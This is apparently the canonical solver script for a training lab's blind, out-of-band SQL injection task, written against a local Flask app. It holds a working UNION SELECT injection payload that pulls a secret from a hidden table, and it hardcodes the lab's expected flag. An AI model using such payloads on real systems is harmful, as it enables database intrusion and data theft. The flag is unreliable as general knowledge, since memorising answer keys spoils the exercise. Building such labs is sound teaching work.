#!/usr/bin/env bash
# solvers/p3_1.sh — Task 3.1 "The Spell Card" canonical exploit.
#
# This floor's own HTTP response is fully blind by design: /p3/spellcard
# renders the exact same "the card was cast into the field" text no matter
# what the injected query returns, or whether it errors at all. There is no
# in-band signal to read at all — the only way to recover anything is
# out-of-band: the Flask route itself relays whatever the query returned to
# the `collaborator` service as a real, separate outbound HTTP call, and the
# only place that value ever becomes observable is collaborator's own
# GET /captures feed (proxied here through the portal's own
# /p3/spellcard/captures route, since collaborator isn't reachable directly
# from outside the docker network).
#
# The injection: `card` is spliced unescaped into a single-quoted string
# context (`WHERE id='{card}'`), so closing the quote and appending a UNION
# SELECT against the hidden `sealed_cards` table swaps in the flag as the
# one column (`effect`) the visible query selects — the same value that
# then gets relayed out-of-band.
set -uo pipefail

BASE="${SEIYAKU_BASE:-http://localhost:8000}"
FLAG="SEIYAKU{word_left_the_island}"

# URL-encoded form of the flag, matching how the app-layer relay encodes the
# value it carries in the outbound request path (urllib.parse.quote(...,
# safe="")) — collaborator logs the raw, still-encoded request path, so we
# match against that same encoding rather than decoding captures ourselves.
ENC_FLAG=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "$FLAG")

PAYLOAD="nonexistent' UNION SELECT secret FROM sealed_cards-- -"

echo "[p3_1] GET ${BASE}/p3/spellcard — fully-blind OOB injection"
echo "[p3_1] payload: card=${PAYLOAD}"

resp=$(curl -s -G "${BASE}/p3/spellcard" --data-urlencode "card=${PAYLOAD}")

# The response must NOT contain the flag — it's supposed to be fully blind.
# This isn't the pass/fail check (that's the polling loop below); it's a
# sanity assertion that the "blind" property actually holds.
if echo "$resp" | grep -qF "$FLAG"; then
    echo "[p3_1] WARNING: flag appeared in the in-band HTTP response — this"
    echo "  breaks the fully-blind property the lesson depends on."
fi

echo "[p3_1] polling ${BASE}/p3/spellcard/captures for the out-of-band confirmation..."

found=""
for i in $(seq 1 30); do
    captures=$(curl -s "${BASE}/p3/spellcard/captures")
    if echo "$captures" | grep -qF "$ENC_FLAG"; then
        found="1"
        break
    fi
    sleep 1
done

if [ -n "$found" ]; then
    echo "[p3_1] ok: flag recovered out-of-band from collaborator's captures: ${FLAG}"
    echo "[p3_1] PASS"
    exit 0
else
    echo "[p3_1] FAIL: flag never appeared in collaborator's captures within the timeout"
    echo "---- last captures poll ----"
    echo "$captures"
    echo "-----------------------------"
    echo "[p3_1] FAIL"
    exit 1
fi
